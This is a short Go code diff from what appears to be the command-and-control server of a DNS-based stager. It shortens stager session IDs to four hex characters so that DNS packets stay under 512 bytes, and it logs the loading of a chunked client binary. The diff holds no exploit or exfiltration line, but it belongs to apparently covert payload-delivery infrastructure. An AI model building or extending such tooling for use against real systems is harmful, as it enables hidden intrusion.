@@ -1354,8 +1354,8 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Printf("[API] ✅ Loaded client binary: %s (%d chunks)\n", clientBinaryID, totalChunks)
 
-	// Create stager session
-	sessionID := fmt.Sprintf("stg_%d_%d", time.Now().UnixNano(), rand.Intn(10000))
+	// Create stager session (4-char random ID to keep DNS packets under 512 bytes)
+	sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))
 
 	err = api.db.CreateStagerSession(
 		sessionID,
